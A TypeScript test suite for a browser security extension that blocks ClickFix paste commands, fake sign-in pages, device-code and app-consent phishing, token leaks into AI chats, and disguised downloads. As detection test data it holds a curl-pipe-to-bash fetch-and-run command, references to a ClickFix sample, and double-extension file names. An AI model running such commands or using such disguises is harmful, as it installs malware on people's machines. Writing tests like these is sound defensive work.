// Copyright 2026 The SafetyCatch Authors
// SPDX-License-Identifier: Apache-2.0
//
// The service worker's logic, run with the real detection engine, in-memory
// storage and the real message catalogs (no browser needed).

import assert from 'node:assert/strict';
import { test } from 'node:test';
import type { StateReply } from '../src/background/core.ts';
import { HISTORY_KEY, type HistoryEntry } from '../src/shared/history.ts';
import { parseModel, type WarningModel } from '../src/shared/model.ts';
import type { AuthReply, ClipboardReply, LoginReply, PageReply, SecretsReply } from '../src/shared/protocol.ts';
import { SETTINGS_KEY } from '../src/shared/settings.ts';
import { clickFixSample, fakeToken, from, harmlessLure, harness, LURE_PAGE_TEXT, realEngine } from './helpers.ts';

const PAGE = 'https://captcha-check.example/verify';
const clip = (text: string, over: Record<string, unknown> = {}): { type: 'check-clipboard'; text: string; pageText: string; source: 'programmatic'; tampered: boolean } => ({ type: 'check-clipboard', text, pageText: '', source: 'programmatic', tampered: false, ...over }) as never;
const model = (raw: unknown): WarningModel => {
  const m = parseModel(raw);
  assert.ok(m, 'reply carries a valid warning model');
  return m;
};
/** Recent warnings, once every queued write has landed (recording never delays a reply). */
const history = async (h: ReturnType<typeof harness>): Promise<HistoryEntry[]> => {
  await h.core.idle();
  return (h.local.data[HISTORY_KEY] ?? []) as HistoryEntry[];
};
const allText = (m: WarningModel): string => JSON.stringify(m);

test('clipboard: a ClickFix command copied by a page is blocked, explained and recorded', async () => {
  const h = harness();
  const sample = clickFixSample();
  const r = (await h.core.handleContent(clip(sample, { pageText: LURE_PAGE_TEXT }), from(PAGE))) as ClipboardReply;
  assert.equal(r.action, 'block');
  assert.match(r.note ?? '', /^SafetyCatch removed a risky command/);
  const m = model(r.model);
  assert.equal(m.kind, 'paste-block');
  assert.equal(m.layout, 'page');
  assert.equal(m.level, 'critical');
  assert.equal(m.title, 'This page secretly copied a command');
  assert.ok(m.lead[0]?.includes('captcha-check.example'));
  assert.ok(m.sample?.text.includes('cdn.example.test'));
  assert.deepEqual(m.buttons.map((b) => [b.id, b.style]), [['keep', 'primary'], ['clear', 'secondary'], ['restore', 'hold']]);
  assert.equal(m.friction?.word, 'allow');
  assert.ok(m.sections[0]?.items[0]?.startsWith('Real websites never ask'));
  assert.ok((m.sections[1]?.items.length ?? 0) > 0, 'advice is included');
  assert.equal((await history(h)).length, 1);
  assert.deepEqual({ d: (await history(h))[0]?.d, m: (await history(h))[0]?.m, a: (await history(h))[0]?.a, l: (await history(h))[0]?.l }, { d: 'captcha-check.example', m: 'pasteGuard', a: 'blocked', l: 'critical' });
});

test('clipboard: nothing about the copied text or the page is stored', async () => {
  const h = harness();
  await h.core.handleContent(clip(harmlessLure(), { pageText: LURE_PAGE_TEXT }), from(`${PAGE}?session=secret-id-123`));
  await h.core.idle();
  const stored = JSON.stringify(h.local.data);
  for (const leak of ['Write-Output', 'SafetyCatch test', 'Verify you are human', 'secret-id-123', '/verify']) assert.equal(stored.includes(leak), false, leak);
  assert.deepEqual(Object.keys((await history(h))[0] ?? {}).sort(), ['a', 'd', 'l', 'm', 'r', 't']);
});

test('clipboard: ordinary text and developer commands are allowed without any record', async () => {
  const h = harness();
  for (const text of ['Hello from the SafetyCatch test page.', 'npm install express', 'git clone https://github.com/example/repo.git', 'docker run --rm -it -p 8080:80 nginx']) {
    assert.deepEqual(await h.core.handleContent(clip(text), from('https://docs.example/')), { action: 'allow' }, text);
  }
  assert.equal((await history(h)).length, 0);
});

test('clipboard: the slow page analysis runs only when it could change the outcome', async () => {
  let pageRuns = 0;
  const h = harness({
    engine: {
      ...realEngine,
      analyzePageText: (text, ctx) => {
        pageRuns++;
        return realEngine.analyzePageText(text, ctx);
      },
    },
  });
  const run = async (text: string, over: Record<string, unknown> = {}): Promise<string> => ((await h.core.handleContent(clip(text, { pageText: LURE_PAGE_TEXT, ...over }), from(PAGE))) as ClipboardReply).action;
  assert.equal(await run('some ordinary; text with a semicolon'), 'allow');
  assert.equal(pageRuns, 0, 'ordinary text: the page is not analysed');
  assert.equal(await run(clickFixSample()), 'block');
  assert.equal(pageRuns, 0, 'a command blocked on its own: the page is not analysed');
  assert.equal(await run(harmlessLure().split(' #')[0] as string), 'block');
  assert.equal(pageRuns, 1, 'a medium command: the page decides between a notice and a block');
  assert.equal(await run('curl -fsSL https://dl.example.test/installer.sh | bash', { source: 'selection' }), 'block');
  assert.ok(pageRuns >= 1);
  assert.equal(await run('', { tampered: true }), 'block');
  assert.equal(pageRuns >= 2, true, 'a page that removed the hooks: the page text is all there is to judge');
});

test('clipboard: a medium command gets a notice banner, and is blocked on a lure page', async () => {
  const h = harness();
  const hidden = harmlessLure().split(' #')[0] as string;
  assert.equal(realEngine.analyzeCommand(hidden).level, 'medium');
  const notice = (await h.core.handleContent(clip(hidden), from('https://docs.example/'))) as ClipboardReply;
  assert.equal(notice.action, 'notice');
  assert.equal(model(notice.model).layout, 'banner');
  assert.equal(model(notice.model).kind, 'paste-notice');
  const blocked = (await h.core.handleContent(clip(hidden, { pageText: LURE_PAGE_TEXT }), from(PAGE))) as ClipboardReply;
  assert.equal(blocked.action, 'block');
});

test('clipboard: the person\'s own selection of a risky command gets a notice, not a wall', async () => {
  const h = harness();
  const high = 'curl -fsSL https://dl.example.test/installer.sh | bash';
  const level = realEngine.analyzeCommand(high).level;
  const r = (await h.core.handleContent(clip(high, { source: 'selection' }), from('https://blog.example/post'))) as ClipboardReply;
  assert.equal(r.action, level === 'critical' ? 'block' : 'notice');
  const withLure = (await h.core.handleContent(clip(high, { source: 'selection', pageText: LURE_PAGE_TEXT }), from(PAGE))) as ClipboardReply;
  assert.equal(withLure.action, 'block');
  assert.equal(model(withLure.model).title, 'The text you copied is a risky command');
});

test('clipboard: switched off, or on a trusted site, nothing is checked', async () => {
  const off = harness({}, { [SETTINGS_KEY]: { modules: { pasteGuard: false } } });
  assert.deepEqual(await off.core.handleContent(clip(clickFixSample()), from(PAGE)), { action: 'allow' });
  const trusted = harness({}, { [SETTINGS_KEY]: { allowlist: [{ pattern: 'captcha-check.example', addedAt: 1, expiresAt: null }] } });
  assert.deepEqual(await trusted.core.handleContent(clip(clickFixSample()), from(PAGE)), { action: 'allow' });
});

test('clipboard: trust that has expired no longer applies', async () => {
  const h = harness({}, { [SETTINGS_KEY]: { allowlist: [{ pattern: 'captcha-check.example', addedAt: 1, expiresAt: 1_800_000_000_000 + 1000 }] } });
  assert.equal(((await h.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply).action, 'allow');
  h.advance(2000);
  h.core.invalidate();
  assert.equal(((await h.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply).action, 'block');
});

test('clipboard: a copy inside a sub-frame is shown in the top frame', async () => {
  const h = harness();
  const sample = clickFixSample();
  const r = (await h.core.handleContent(clip(sample), from(PAGE, 5, 7))) as ClipboardReply;
  assert.equal(r.action, 'block');
  assert.equal(r.shownInTop, true);
  assert.equal(h.shown.length, 1);
  assert.equal(h.shown[0]?.text, sample);
  assert.equal(model(h.shown[0]?.model).kind, 'paste-block');
  const top = (await h.core.handleContent(clip(sample), from(PAGE, 5, 0))) as ClipboardReply;
  assert.equal(top.shownInTop, false);
});

test('clipboard: if the top frame cannot show it, the sub-frame is told to show it itself', async () => {
  const h = harness({ showInTop: async () => Promise.reject(new Error('no receiver')) });
  const r = (await h.core.handleContent(clip(clickFixSample()), from(PAGE, 5, 7))) as ClipboardReply;
  assert.equal(r.action, 'block');
  assert.equal(r.shownInTop, false);
});

test('fail safe: when the engine throws, a command-looking copy is still blocked as "not checked"', async () => {
  const h = harness({
    engine: {
      ...realEngine,
      analyzeCommand: () => {
        throw new Error('engine crashed');
      },
    },
  });
  const r = (await h.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply;
  assert.equal(r.action, 'block');
  const m = model(r.model);
  assert.equal(m.levelLabel, 'Not checked');
  assert.equal(m.title, 'Copied text looks like a command');
  const benign = (await h.core.handleContent(clip('some; text that needed a check'), from(PAGE))) as ClipboardReply;
  assert.equal(benign.action, 'unchecked');
  assert.equal(model(benign.model).title, 'Could not check copied text');
  assert.equal(/safe/i.test(allText(model(benign.model))), false, 'never call unchecked text safe');
});

test('fail safe: an "incomplete" verdict from the engine counts as not checked', async () => {
  const h = harness({ engine: { ...realEngine, analyzeCommand: () => ({ analyzer: 'command', level: 'low', score: 10, findings: [], advice: [], meta: { incomplete: true } }) } });
  assert.equal(((await h.core.handleContent(clip('some; text that needed a check'), from(PAGE))) as ClipboardReply).action, 'unchecked');
});

test('fail safe: broken storage does not switch protection off', async () => {
  const h = harness();
  h.local.failing = true;
  h.session.failing = true;
  const r = (await h.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply;
  assert.equal(r.action, 'block');
});

test('clipboard: a page that removed the hooks and shows a lure is blocked even without the copied text', async () => {
  const h = harness();
  const r = (await h.core.handleContent(clip('', { tampered: true, pageText: LURE_PAGE_TEXT }), from(PAGE))) as ClipboardReply;
  assert.equal(r.action, 'block');
  const m = model(r.model);
  assert.equal(m.title, 'This page wants you to paste a command');
  assert.equal(m.sample, undefined);
  assert.equal(m.buttons.some((b) => b.id === 'restore'), false);
  const calm = (await h.core.handleContent(clip('', { tampered: true, pageText: 'Welcome to my recipe blog.' }), from(PAGE))) as ClipboardReply;
  assert.equal(calm.action, 'allow');
});

test('look-alike sign-in: brand, real address, banner and full-page model', async () => {
  const h = harness();
  const r = (await h.core.handleContent({ type: 'check-login', title: 'PayPal: Log in to your account', pageText: 'Log in to PayPal', referrer: '' }, from('https://paypa1-login.example/signin'))) as LoginReply;
  assert.equal(r.ui, 'intercept');
  const page = model(r.model);
  assert.equal(page.title, 'This may be a fake PayPal sign-in page');
  assert.ok(page.lead.some((l) => l.includes('paypa1-login.example')));
  assert.ok(page.lead.includes('The real PayPal address is paypal.com.'));
  assert.deepEqual(page.buttons.map((b) => [b.id, b.style]), [['leave', 'primary'], ['stay', 'hold']]);
  const banner = model(r.banner);
  assert.equal(banner.layout, 'banner');
  assert.ok(banner.lead.join(' ').includes('paypal.com'));
  assert.equal((await history(h))[0]?.m, 'lookalike');
});

test('look-alike sign-in: the real address is found even when the engine does not hand it over', async () => {
  const h = harness();
  const r = (await h.core.handleContent({ type: 'check-login', title: 'PayPal: Log in to your account', pageText: '', referrer: '' }, from('http://localhost:8123/login.html'))) as LoginReply;
  assert.equal(r.ui, 'intercept');
  assert.ok(model(r.model).lead.includes('The real PayPal address is paypal.com.'));
});

test('look-alike sign-in: real brand sites and ordinary sign-in pages show nothing', async () => {
  const h = harness();
  for (const [url, title] of [
    ['https://www.paypal.com/signin', 'Log in to your PayPal account'],
    ['https://my-blog.example/login', 'Sign in - My Blog'],
    ['https://github.com/login', 'Sign in to GitHub'],
  ] as const) {
    assert.deepEqual(await h.core.handleContent({ type: 'check-login', title, pageText: '', referrer: '' }, from(url)), { ui: 'none' }, url);
  }
  assert.equal((await history(h)).length, 0);
});

test('look-alike sign-in: small signals that only add up give a banner, not a wall', async () => {
  const h = harness();
  const r = (await h.core.handleContent({ type: 'check-login', title: 'Sign in - My Blog', pageText: '', referrer: '' }, from('http://my-blog.example:8123/login.html'))) as LoginReply;
  assert.equal(r.ui, 'banner');
  assert.equal(r.model, undefined);
  assert.equal(model(r.banner).title, 'Check the address before you sign in');
});

test('look-alike sign-in: after the person chose to stay, the same tab is not walled again for a while', async () => {
  const h = harness();
  const sender = from('https://paypa1-login.example/signin', 3);
  const req = { type: 'check-login', title: 'PayPal: Log in', pageText: '', referrer: '' } as const;
  assert.equal(((await h.core.handleContent(req, sender)) as LoginReply).ui, 'intercept');
  await h.core.handleContent({ type: 'ack', scope: 'login' }, sender);
  assert.equal(((await h.core.handleContent(req, sender)) as LoginReply).ui, 'banner');
  assert.equal(((await h.core.handleContent(req, from('https://paypa1-login.example/signin', 4))) as LoginReply).ui, 'intercept');
  h.advance(11 * 60 * 1000);
  assert.equal(((await h.core.handleContent(req, sender)) as LoginReply).ui, 'intercept');
});

const DEVICE = 'https://microsoft.com/devicelogin';

test('device code: opened by typing the address gives a calm banner', async () => {
  const h = harness();
  await h.core.navCommitted(1, DEVICE, 'typed', []);
  const r = (await h.core.handleContent({ type: 'check-auth', referrer: '' }, from(DEVICE))) as AuthReply;
  assert.equal(r.ui, 'banner');
  const m = model(r.model);
  assert.equal(m.title, 'Only enter a code here if you started this yourself');
  assert.ok(m.lead[0]?.includes('Microsoft'));
  assert.equal(m.level, 'medium');
});

test('device code: reached from a webmail message is critical and names where you came from', async () => {
  const h = harness();
  await h.core.navCommitted(1, 'https://mail.google.com/mail/u/0/', 'typed', []);
  await h.core.navCommitted(1, DEVICE, 'link', []);
  const r = (await h.core.handleContent({ type: 'check-auth', referrer: '' }, from(DEVICE))) as AuthReply;
  assert.equal(r.ui, 'interstitial');
  const m = model(r.model);
  assert.equal(m.level, 'critical');
  assert.ok(m.lead.includes('You came here from mail.google.com.'));
  assert.deepEqual(m.buttons.map((b) => [b.id, b.style]), [['leave', 'primary'], ['continue', 'hold']]);
});

test('device code: reached through a redirector from an unrelated site is high', async () => {
  const h = harness();
  await h.core.navCommitted(1, 'https://news.example/story', 'typed', []);
  await h.core.navBefore(1, 'https://track.example/r?id=9');
  await h.core.navCommitted(1, DEVICE, 'link', ['server_redirect']);
  const r = (await h.core.handleContent({ type: 'check-auth', referrer: '' }, from(DEVICE))) as AuthReply;
  assert.equal(r.ui, 'interstitial');
  assert.ok(['high', 'critical'].includes(model(r.model).level));
});

test('device code: a link from outside the browser raises the level and says so', async () => {
  const h = harness();
  await h.core.navCommitted(9, DEVICE, 'link', []);
  const r = (await h.core.handleContent({ type: 'check-auth', referrer: '' }, from(DEVICE, 9))) as AuthReply;
  assert.equal(r.ui, 'interstitial');
  const m = model(r.model);
  assert.equal(m.level, 'high');
  assert.ok(m.lead.includes('You came here from a link outside your browser, such as an email or chat message.'));
});

test('device code: after a deliberate "continue", a reload shows the banner only', async () => {
  const h = harness();
  await h.core.navCommitted(9, DEVICE, 'link', []);
  const sender = from(DEVICE, 9);
  assert.equal(((await h.core.handleContent({ type: 'check-auth', referrer: '' }, sender)) as AuthReply).ui, 'interstitial');
  await h.core.handleContent({ type: 'ack', scope: 'auth' }, sender);
  assert.equal(((await h.core.handleContent({ type: 'check-auth', referrer: '' }, sender)) as AuthReply).ui, 'banner');
});

test('app approval: risky permissions are listed in plain language', async () => {
  const h = harness();
  const url = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=abc&scope=Mail.ReadWrite%20Mail.Send%20offline_access%20openid&response_type=code';
  await h.core.navCommitted(1, url, 'typed', []);
  const r = (await h.core.handleContent({ type: 'check-auth', referrer: '' }, from(url))) as AuthReply;
  assert.equal(r.ui, 'interstitial');
  const m = model(r.model);
  assert.equal(m.title, 'An app is asking for access to your Microsoft account');
  const asks = m.sections.find((s) => s.title === 'The app is asking to:');
  assert.ok(asks);
  assert.ok(asks.items.some((i) => i.startsWith('Read, change and delete your email') && i.includes('Mail.ReadWrite')));
  assert.ok(asks.items.some((i) => i.startsWith('Send email as you') && i.includes('Mail.Send')));
  assert.ok(asks.items.some((i) => i.startsWith('See your name, email address and profile') && i.includes('openid')));
});

test('app approval: an everyday "sign in with" request shows nothing', async () => {
  const h = harness();
  const url = 'https://accounts.google.com/o/oauth2/v2/auth?client_id=x&scope=openid%20email%20profile&response_type=code';
  await h.core.navCommitted(1, 'https://shop.example/login', 'typed', []);
  await h.core.navCommitted(1, url, 'link', []);
  assert.deepEqual(await h.core.handleContent({ type: 'check-auth', referrer: 'https://shop.example/' }, from(url)), { ui: 'none' });
  assert.deepEqual(await h.core.handleContent({ type: 'check-auth', referrer: '' }, from('https://github.com/example/repo')), { ui: 'none' });
});

test('platform pages: the slow one-off rule compilation is started ahead of the question, once', async () => {
  let pageRuns = 0;
  const h = harness({
    engine: {
      ...realEngine,
      analyzePageText: (text, ctx) => {
        pageRuns++;
        return realEngine.analyzePageText(text, ctx);
      },
    },
  });
  await h.core.navCommitted(1, 'https://ordinary-site.example/', 'typed', []);
  assert.equal(h.deferred.length, 0, 'ordinary sites cost nothing');
  await h.core.navCommitted(1, 'https://chatgpt.com/share/abc', 'link', []);
  assert.equal(h.deferred.length, 1);
  assert.equal(pageRuns, 0, 'the work is deferred, not done inside the navigation event');
  for (const job of h.deferred) job();
  assert.equal(pageRuns, 2);
  await h.core.navCommitted(2, 'https://sites.google.com/view/x', 'link', []);
  for (const job of h.deferred) job();
  assert.equal(pageRuns, 2, 'only once per worker life');
});

test('platform lure: paste-and-run steps on a shared AI chat get a strong warning', async () => {
  const h = harness();
  const r = (await h.core.handleContent({ type: 'check-page', pageText: LURE_PAGE_TEXT }, from('https://chatgpt.com/share/abc'))) as PageReply;
  assert.equal(r.ui, 'warn');
  const m = model(r.model);
  assert.equal(m.title, 'Do not follow the steps on this page');
  assert.ok(m.lead[1]?.includes('a shared ChatGPT conversation'));
});

test('platform lure: plain download-and-run steps get a calm notice; a harmless page gets nothing', async () => {
  const h = harness();
  const url = 'https://sites.google.com/view/help';
  const r = (await h.core.handleContent({ type: 'check-page', pageText: 'Download the setup file below and run the installer to get started with our app.' }, from(url))) as PageReply;
  assert.equal(r.ui, 'notice');
  assert.equal(model(r.model).level, 'low');
  assert.equal(model(r.model).title, 'This page was written by an unknown person');
  // A fake "fix" that also tells you to bypass the security warning is a real lure: strong warning.
  const lure = (await h.core.handleContent({ type: 'check-page', pageText: 'To fix this problem, download the repair tool below, then open the downloaded installer and choose Run anyway.' }, from(url))) as PageReply;
  assert.equal(lure.ui, 'warn');
  assert.deepEqual(await h.core.handleContent({ type: 'check-page', pageText: 'Welcome to my recipe blog. Today we bake bread.' }, from(url)), { ui: 'none' });
  assert.deepEqual(await h.core.handleContent({ type: 'check-page', pageText: LURE_PAGE_TEXT }, from('https://ordinary-site.example/')), { ui: 'none' });
});

test('AI chat: a token is found, described without being shown, and redacted', async () => {
  const h = harness();
  const text = `Please debug: token = ${fakeToken()} thanks`;
  const r = (await h.core.handleContent({ type: 'check-secrets', text }, from('https://chatgpt.com/c/1'))) as SecretsReply;
  assert.equal(r.action, 'prompt');
  assert.equal(r.redacted, 'Please debug: token = [REDACTED:github-token] thanks');
  const m = model(r.model);
  assert.equal(m.layout, 'dialog');
  assert.deepEqual(m.buttons.map((b) => [b.id, b.style]), [['redact', 'primary'], ['cancel', 'secondary'], ['anyway', 'hold']]);
  assert.equal(allText(m).includes(fakeToken()), false);
  assert.equal(allText(m).includes(fakeToken().slice(8, 30)), false);
  assert.ok(m.sections[0]?.items.some((i) => i.startsWith('GitHub token')));
  await h.core.idle();
  assert.equal(JSON.stringify(h.local.data).includes(fakeToken().slice(8, 30)), false);
});

test('AI chat: ordinary text and low findings (an email address) pass straight through', async () => {
  const h = harness();
  for (const text of ['Please summarise the plot of a famous novel in three sentences.', 'Write a reply to jane.doe@example.com about lunch.']) {
    assert.deepEqual(await h.core.handleContent({ type: 'check-secrets', text }, from('https://claude.ai/chat/1')), { action: 'allow' }, text);
  }
});

test('AI chat: when the scan fails the reply is "unchecked", never "allow"', async () => {
  const h = harness({
    engine: {
      ...realEngine,
      scanSecrets: () => {
        throw new Error('boom');
      },
    },
  });
  const r = (await h.core.handleContent({ type: 'check-secrets', text: `token = ${fakeToken()}` }, from('https://chatgpt.com/'))) as SecretsReply;
  assert.equal(r.action, 'unchecked');
  assert.equal(r.redacted, undefined);
  assert.equal(model(r.model).title, 'Could not check this text');
});

test('warnings are written in the chosen language, right-to-left where needed', async () => {
  const h = harness({}, { [SETTINGS_KEY]: { language: 'ur' } });
  const r = (await h.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply;
  const m = model(r.model);
  assert.equal(m.dir, 'rtl');
  assert.equal(m.lang, 'ur');
  assert.notEqual(m.title, 'This page secretly copied a command');
  assert.equal(m.friction?.word, 'اجازت');
  const auto = harness();
  auto.language = 'es-MX';
  const es = model(((await auto.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply).model);
  assert.equal(es.lang, 'es');
  assert.equal(es.title, 'Esta página copió un comando a escondidas');
  assert.equal(es.levelLabel, realEngine.levelLabel('critical', 'es'));
});

test('if a translation cannot be loaded, the warning falls back to English instead of failing', async () => {
  const h = harness({ loadMessages: async (folder) => (folder === 'en' ? (await import('../scripts/locales.ts')).messagesJson('en') : Promise.reject(new Error('missing'))) }, { [SETTINGS_KEY]: { language: 'fr' } });
  const r = (await h.core.handleContent(clip(clickFixSample()), from(PAGE))) as ClipboardReply;
  assert.equal(model(r.model).title, 'This page secretly copied a command');
});

test('reports from the page are stored under the site of the tab, not under anything the page says', async () => {
  const h = harness();
  await h.core.handleContent({ type: 'report', module: 'pasteGuard', action: 'restored', level: 'high', ruleIds: ['cmd.a'] }, from('https://sub.captcha-check.example/x'));
  assert.deepEqual((await history(h)).map((e) => [e.d, e.a]), [['captcha-check.example', 'restored']]);
  await h.core.handleContent({ type: 'report', module: 'pasteGuard', action: 'restored', level: 'high', ruleIds: [] }, from('chrome://settings'));
  assert.equal((await history(h)).length, 1);
});

test('"leave this page" sends the tab away', async () => {
  const h = harness();
  assert.deepEqual(await h.core.handleContent({ type: 'leave' }, from(DEVICE, 12)), { ok: true });
  assert.deepEqual(h.left, [12]);
});

test('state for the popup: settings, catalog, level names and trust for the current site', async () => {
  const h = harness();
  const s = (await h.core.handlePage({ type: 'get-state', url: 'https://www.example.com/page' })) as StateReply;
  assert.equal(s.ok, true);
  assert.equal(s.site.host, 'www.example.com');
  assert.equal(s.site.canRun, true);
  assert.equal(s.site.trust, null);
  assert.equal(s.messages['popup_modules'], 'Protections');
  assert.equal(s.levels.high, 'High risk');
  assert.equal(s.engineVersion, realEngine.ENGINE_VERSION);
  assert.equal(((await h.core.handlePage({ type: 'get-state', url: 'chrome://extensions' })) as StateReply).site.canRun, false);
  assert.equal(((await h.core.handlePage({ type: 'get-state', url: 'https://chromewebstore.google.com/' })) as StateReply).site.canRun, false);
});

test('trusting a site: added with an end date, visible in state, removable', async () => {
  const h = harness();
  assert.deepEqual(await h.core.handlePage({ type: 'add-trust', pattern: 'https://Docs.Example.com/guide', duration: 'hour' }), { ok: true });
  let s = (await h.core.handlePage({ type: 'get-state', url: 'https://docs.example.com/' })) as StateReply;
  assert.equal(s.site.trust?.pattern, 'docs.example.com');
  assert.equal(s.site.trust?.expiresAt, 1_800_000_000_000 + 60 * 60 * 1000);
  assert.deepEqual(await h.core.handlePage({ type: 'remove-trust', pattern: 'docs.example.com' }), { ok: true });
  s = (await h.core.handlePage({ type: 'get-state', url: 'https://docs.example.com/' })) as StateReply;
  assert.equal(s.site.trust, null);
});

test('trusting a site: wildcards over public suffixes or publish-anything platforms are refused', async () => {
  const h = harness();
  for (const pattern of ['*.com', '*.co.uk', '*.github.io', '*.pages.dev', 'not a host', '*']) {
    assert.deepEqual(await h.core.handlePage({ type: 'add-trust', pattern, duration: 'day' }), { ok: false, error: 'invalid' }, pattern);
  }
  assert.deepEqual(await h.core.handlePage({ type: 'add-trust', pattern: 'example.com', duration: 'a-century' }), { ok: false, error: 'invalid' });
  assert.deepEqual(await h.core.handlePage({ type: 'add-trust', pattern: '*.example.co.uk', duration: 'forever' }), { ok: true });
  assert.deepEqual(await h.core.handlePage({ type: 'add-trust', pattern: 'someone.github.io', duration: 'day' }), { ok: true });
});

test('settings from the options page are sanitised before they are saved', async () => {
  const h = harness();
  await h.core.handlePage({ type: 'set-settings', settings: { modules: { downloads: false }, aiSites: ['chat.example', '<bad>'], language: 'id', allowlist: [{ pattern: '*.github.io' }, { pattern: 'ok.example' }], rogue: true } });
  const saved = h.local.data[SETTINGS_KEY] as Record<string, unknown>;
  assert.deepEqual(saved['aiSites'], ['chat.example']);
  assert.equal(saved['language'], 'id');
  assert.equal('rogue' in saved, false);
  assert.deepEqual((saved['allowlist'] as Array<{ pattern: string }>).map((e) => e.pattern), ['ok.example']);
  await h.core.handlePage({ type: 'set-module', module: 'downloads', enabled: true });
  assert.equal((h.local.data[SETTINGS_KEY] as { modules: Record<string, boolean> }).modules['downloads'], true);
});

test('import and clear-history', async () => {
  const h = harness();
  assert.deepEqual(await h.core.handlePage({ type: 'import-settings', json: 'not json' }), { ok: false, error: 'not-json' });
  const json = JSON.stringify({ app: 'safetycatch-browser-extension', settings: { language: 'hi', modules: { aiPaste: false } } });
  assert.deepEqual(await h.core.handlePage({ type: 'import-settings', json }), { ok: true });
  const s = (await h.core.handlePage({ type: 'get-state', url: '' })) as StateReply;
  assert.equal(s.locale, 'hi');
  assert.equal(s.settings.modules.aiPaste, false);
  await h.core.handleContent(clip(clickFixSample()), from(PAGE));
  assert.equal((await history(h)).length, 1);
  await h.core.handlePage({ type: 'clear-history' });
  assert.equal((await history(h)).length, 0);
});

test('history stays capped however many warnings fire', async () => {
  const h = harness();
  for (let i = 0; i < 70; i++) {
    h.advance(60_000);
    await h.core.handleContent(clip(clickFixSample()), from(`https://site${i}.example/`));
  }
  assert.equal((await history(h)).length, 50);
  assert.equal((await history(h))[0]?.d, 'site69.example');
});

const risky = { id: 31, url: 'https://files.example/get/Invoice_2026.pdf.js', referrer: 'https://mail.example/inbox', filename: '' };

test('downloads: a disguised script asks first, once, and is recorded without its name', async () => {
  const h = harness();
  assert.equal(await h.core.downloadSeen(risky, 'https://mail.example/inbox'), true);
  assert.equal(await h.core.downloadSeen(risky, 'https://mail.example/inbox'), false, 'the same download is not asked about twice');
  assert.equal(await h.core.pendingCount(), 1);
  assert.equal((await history(h))[0]?.m, 'downloads');
  assert.equal(JSON.stringify(h.local.data).includes('Invoice_2026'), false);
  const info = (await h.core.handlePage({ type: 'download-info', id: 31 })) as { ok: boolean; model: unknown };
  assert.equal(info.ok, true);
  const m = model(info.model);
  assert.equal(m.kind, 'download');
  assert.ok(m.lead[0]?.includes('Invoice_2026.pdf.js'));
  assert.ok(m.lead[0]?.includes('mail.example'));
  assert.deepEqual(m.buttons.map((b) => [b.id, b.style]), [['cancel', 'primary'], ['resume', 'hold']]);
});

test('downloads: ordinary files, a disabled protection and trusted sites do not ask', async () => {
  const h = harness();
  assert.equal(await h.core.downloadSeen({ id: 1, url: 'https://files.example/report.pdf', filename: '' }, ''), false);
  assert.equal(await h.core.downloadSeen({ id: 2, url: 'https://files.example/notes.txt', filename: 'C:\\Users\\me\\Downloads\\notes.txt' }, ''), false);
  assert.equal(await h.core.downloadSeen({ id: 3, url: 'https://files.example/download?id=3', filename: '' }, ''), false);
  const off = harness({}, { [SETTINGS_KEY]: { modules: { downloads: false } } });
  assert.equal(await off.core.downloadSeen(risky, ''), false);
  const trusted = harness({}, { [SETTINGS_KEY]: { allowlist: [{ pattern: 'mail.example', addedAt: 1, expiresAt: null }] } });
  assert.equal(await trusted.core.downloadSeen(risky, 'https://mail.example/inbox'), false);
});

test('downloads: the real file name, when it arrives later, is judged too', async () => {
  const h = harness();
  const item = { id: 8, url: 'https://files.example/download?id=8', filename: '' };
  assert.equal(await h.core.downloadSeen(item, ''), false);
  assert.equal(await h.core.downloadSeen({ ...item, filename: 'C:\\Users\\me\\Downloads\\photo.jpg.scr' }, ''), true);
});

test('downloads: choices are carried out once and only when they fit the state', async () => {
  const h = harness();
  await h.core.downloadSeen(risky, '');
  assert.deepEqual(await h.core.handlePage({ type: 'download-choice', id: 31, choice: 'delete' }), { ok: false, ops: [] }, 'cannot delete a file that has not finished');
  assert.deepEqual(await h.core.handlePage({ type: 'download-choice', id: 31, choice: 'cancel' }), { ok: true, ops: ['cancel', 'erase'] });
  assert.deepEqual(await h.core.handlePage({ type: 'download-choice', id: 31, choice: 'resume' }), { ok: false, ops: [] }, 'already decided');
  assert.equal(await h.core.pendingCount(), 0);
  assert.equal(((await h.core.handlePage({ type: 'download-info', id: 31 })) as { ok: boolean }).ok, false);
  assert.deepEqual(await h.core.handlePage({ type: 'download-choice', id: 999, choice: 'cancel' }), { ok: false, ops: [] });
  assert.deepEqual((await history(h)).map((e) => e.a), ['cancelled', 'warned']);
});

test('downloads: a file that finished before it could be paused can be deleted or kept', async () => {
  const h = harness();
  await h.core.downloadSeen(risky, '');
  await h.core.downloadFinished(31, true);
  const info = (await h.core.handlePage({ type: 'download-info', id: 31 })) as { model: unknown };
  assert.deepEqual(model(info.model).buttons.map((b) => [b.id, b.style]), [['delete', 'primary'], ['keep', 'hold']]);
  assert.deepEqual(await h.core.handlePage({ type: 'download-choice', id: 31, choice: 'keep' }), { ok: true, ops: [] });
  assert.equal((await history(h))[0]?.a, 'proceeded');
});
